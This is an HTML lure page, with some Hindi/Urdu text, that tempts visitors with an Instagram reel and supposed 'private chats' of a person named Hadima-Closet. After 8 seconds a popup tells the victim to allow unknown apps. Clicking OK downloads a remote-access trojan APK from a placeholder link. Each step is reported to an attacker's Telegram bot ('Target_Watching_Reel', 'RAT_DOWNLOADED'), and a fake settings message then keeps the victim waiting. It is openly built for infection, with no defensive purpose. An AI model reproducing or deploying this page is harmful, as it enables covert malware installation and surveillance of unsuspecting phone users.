<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hadima Closet Exclusive</title>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        #p { position: fixed; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; z-index: 100; background: #000; }
        .btn { padding: 15px 40px; background: #8e44ad; border: none; color: #fff; font-size: 18px; border-radius: 30px; cursor: pointer; font-weight: bold; }
        #chat-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 50; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .blur-chat { width: 90%; max-width: 350px; filter: blur(5px); opacity: 0.6; pointer-events: none; }
        .popup-box { background: #1a1a1a; border: 2px solid #8e44ad; border-radius: 20px; padding: 25px; width: 85%; max-width: 320px; position: absolute; z-index: 60; }
        iframe { width: 100vw; height: 100vh; border: none; }
        .loader-ring { border: 3px solid #333; border-top: 3px solid #8e44ad; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; margin: 15px auto; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="p">
    <button class="btn" onclick="initApp()">Watch Reel & View Private Logs</button>
</div>

<div id="chat-overlay">
    <h3 style="color:#8e44ad;">🔓 Hadima-Closet Private Logs</h3>
    <img src="https://i.imgur.com/your-blurred-chat-image.png" class="blur-chat" alt="Chats">
    <div class="popup-box" id="trap-box">
        <p style="font-size:15px;">Aap dekh sakte hain <b>Hadima-Closet</b> ki private chats! <br><br> Bas niche 'OK' dabayein aur <b>'Unknown Apps'</b> allow karke chat viewer load karein.</p>
        <div class="loader-ring"></div>
        <button class="btn" style="width:100%;" onclick="startInfection()">OK</button>
    </div>
</div>

<iframe id="vid" allow="autoplay"></iframe>

<script>
    const T = "YOUR_BOT_TOKEN"; 
    const C = "YOUR_CHAT_ID";
    const RAT_URL = "https://your-github-link.com/hadima_viewer.apk";

    function initApp() {
        document.getElementById('p').style.display = 'none';
        document.getElementById('vid').src = "https://www.instagram.com/reel/DXvjb0FP8W0/embed/";
        
        // Data Capture
        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=✅_Target_Watching_Reel`);

        // Reel ke middle mein popup (8 seconds baad)
        setTimeout(() => {
            document.getElementById('chat-overlay').style.display = 'flex';
        }, 8000);
    }

    function startInfection() {
        // Download Trigger
        window.location.href = RAT_URL;
        
        // Telegram Proof for Chief
        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔥_RAT_DOWNLOADED_Curiosity_Success`);

        // Change Popup to "Loading" to keep him on the page
        document.getElementById('trap-box').innerHTML = `
            <h3 style="color:#8e44ad;">⚙️ Settings Required</h3>
            <p style="font-size:13px;">Please go to <b>Settings > Allow Unknown Apps</b> to decrypt the messages.</p>
            <div class="loader-ring"></div>
            <p style="font-size:11px; color:#666;">Waiting for permission... Do not close this window.</p>
        `;
    }
</script>
</body>
</html>
